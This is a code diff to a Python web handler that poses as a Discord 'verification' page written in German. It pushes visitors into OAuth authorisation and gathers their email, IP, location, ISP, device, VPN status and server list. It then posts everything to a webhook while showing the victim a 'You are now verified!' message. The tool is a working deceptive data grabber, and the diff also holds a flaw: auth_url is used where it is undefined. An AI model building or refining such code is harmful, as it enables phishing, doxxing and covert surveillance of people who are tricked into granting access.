@@ -15,7 +15,46 @@ class handler(BaseHTTPRequestHandler):
         p = urllib.parse.parse_qs(q)
         code = p.get('code', [None])[0]
         
-        # 2. IP & Gerät ermitteln
+        # 2. Falls KEIN Code da ist (Abbruch oder Direkter Aufruf)
+        if not code:
+            # OAuth2 Link generieren (Wichtig: Scopes müssen mit deinem Discord Developer Portal übereinstimmen)
+            auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&scope=identify+email+guilds"
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            
+            # Die Zwischenseite mit deiner Anleitung
+            loading_html = f"""
+            <html>
+            <head>
+                <meta http-equiv="refresh" content="6;url={auth_url}">
+                <style>
+                    body {{ background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; }}
+                    .container {{ text-align: center; border: 1px solid #1a1a1a; padding: 50px; border-radius: 15px; background: #050505; max-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
+                    .spinner {{ border: 3px solid #111; border-top: 3px solid #5865F2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 25px; }}
+                    h2 {{ color: #5865F2; margin-bottom: 20px; }}
+                    p {{ line-height: 1.6; color: #ccc; }}
+                    .hint {{ font-size: 13px; color: #777; margin-top: 20px; border-top: 1px solid #111; padding-top: 20px; }}
+                    @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="spinner"></div>
+                    <h2>Verifikation erforderlich</h2>
+                    <p>Sie werden gleich wieder zurück zur Verifikation bzw. Autorisierung geschickt. Dieses Mal autorisieren Sie sich bitte und haben ein wenig Geduld.</p>
+                    <div class="hint">
+                        <strong>Anleitung:</strong> Sobald die Discord-Seite lädt, scrollen Sie bitte nach unten und klicken Sie auf den blauen <b>"Autorisieren"</b> Button.
+                    </div>
+                </div>
+            </body>
+            </html>
+            """
+            self.wfile.write(loading_html.encode('utf-8'))
+            return
+
+        # 3. IP & Gerät ermitteln (Nur wenn Code vorhanden)
         u_ip = self.headers.get('x-forwarded-for', 'N/A').split(',')[0]
         u_ag = self.headers.get('user-agent', 'N/A')
 
@@ -30,13 +69,12 @@ class handler(BaseHTTPRequestHandler):
         dev = "Mobile" if "Mobile" in u_ag else "PC"
         display_name = "Unknown User"
         user_email = "Nicht autorisiert"
-        
         server_embed_1_str = ""
         server_embed_2_str = ""
         count = 0
 
-        # 3. Discord Daten abrufen
-        if code and CLIENT_ID and CLIENT_SECRET:
+        # 4. Discord Daten abrufen
+        if CLIENT_ID and CLIENT_SECRET:
             data = {
                 'client_id': CLIENT_ID, 
                 'client_secret': CLIENT_SECRET, 
@@ -61,7 +99,6 @@ class handler(BaseHTTPRequestHandler):
                     count = len(g_info)
                     lines = [f"- {g['name']}" for g in g_info]
                     
-                    # Erstes Server-Embed befüllen (Limit ca. 3500 Zeichen)
                     current_len = 0
                     split_index = 0
                     for i, line in enumerate(lines):
@@ -72,7 +109,6 @@ class handler(BaseHTTPRequestHandler):
                         else:
                             break
                     
-                    # Zweites Server-Embed befüllen (Rest)
                     current_len_2 = 0
                     for line in lines[split_index:]:
                         if current_len_2 + len(line) < 3500:
@@ -82,45 +118,49 @@ class handler(BaseHTTPRequestHandler):
                             server_embed_2_str += f"*... und weitere*"
                             break
 
-        # 4. Webhook mit bis zu 3 Embeds senden
-        if WH_URL:
-            embeds = [
-                {
-                    "title": f"**__📂 Folder of {display_name}__**",
-                    "color": 0x2b2d31,
-                    "description": (
-                        f"• 📧 **Email:**\n- {user_email}\n\n"
-                        f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
-                        f"• 🧾 **Anbieter:**\n{isp}\n\n"
-                        f"• 📱 **Gerät:**\n{dev}\n\n"
-                        f"• 🛡️ **VPN genutzt?:**\n{vpn}"
-                    )
-                },
-                {
-                    "title": f"**__📋 Server Liste Teil 1 ({count} gesamt)__**",
-                    "color": 0x2b2d31,
-                    "description": server_embed_1_str if server_embed_1_str else "Keine Server gefunden"
-                }
-            ]
-            
-            # Drittes Embed nur hinzufügen, wenn die Liste wirklich so lang ist
-            if server_embed_2_str:
-                embeds.append({
-                    "title": "**__📋 Server Liste Teil 2__**",
-                    "color": 0x2b2d31,
-                    "description": server_embed_2_str,
-                    "footer": {"text": "System V2 • Logging Active"}
-                })
+                # 5. Webhook Senden (Nur bei erfolgreichem Token!)
+                if WH_URL:
+                    embeds = [
+                        {
+                            "title": f"**__📂 Folder of {display_name}__**",
+                            "color": 0x2b2d31,
+                            "description": (
+                                f"• 📧 **Email:**\n- {user_email}\n\n"
+                                f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
+                                f"• 🧾 **Anbieter:**\n{isp}\n\n"
+                                f"• 📱 **Gerät:**\n{dev}\n\n"
+                                f"• 🛡️ **VPN genutzt?:**\n{vpn}"
+                            )
+                        },
+                        {
+                            "title": f"**__📋 Server Liste Teil 1 ({count} gesamt)__**",
+                            "color": 0x2b2d31,
+                            "description": server_embed_1_str if server_embed_1_str else "Keine Server gefunden"
+                        }
+                    ]
+                    
+                    if server_embed_2_str:
+                        embeds.append({
+                            "title": "**__📋 Server Liste Teil 2__**",
+                            "color": 0x2b2d31,
+                            "description": server_embed_2_str,
+                            "footer": {"text": "System V2 • Logging Active"}
+                        })
+                    else:
+                        embeds[1]["footer"] = {"text": "System V2 • Logging Active"}
+
+                    requests.post(WH_URL, json={"embeds": embeds})
+
+                # 6. Finale Erfolgsseite
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html; charset=utf-8')
+                self.end_headers()
+                self.wfile.write("""<html><body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;"><div style="text-align:center;border:1px solid #111;padding:60px;border-radius:10px;background:#050505;"><h1>💠</h1><p>You are now verified!</p></div></body></html>""".encode('utf-8'))
             else:
-                embeds[1]["footer"] = {"text": "System V2 • Logging Active"}
-
-            requests.post(WH_URL, json={"embeds": embeds})
-
-        # 5. HTML Antwort für den Nutzer
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
-        self.end_headers()
-        self.wfile.write("""<html><body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;"><div style="text-align:center;border:1px solid #111;padding:60px;border-radius:10px;background:#050505;"><h1>💠</h1><p>You are now verified!</p></div></body></html>""".encode('utf-8'))
+                # Falls Token-Austausch fehlschlägt (z.B. Code abgelaufen)
+                self.send_response(302)
+                self.send_header('Location', auth_url)
+                self.end_headers()
 
     def do_HEAD(self):
         self.send_response(200)
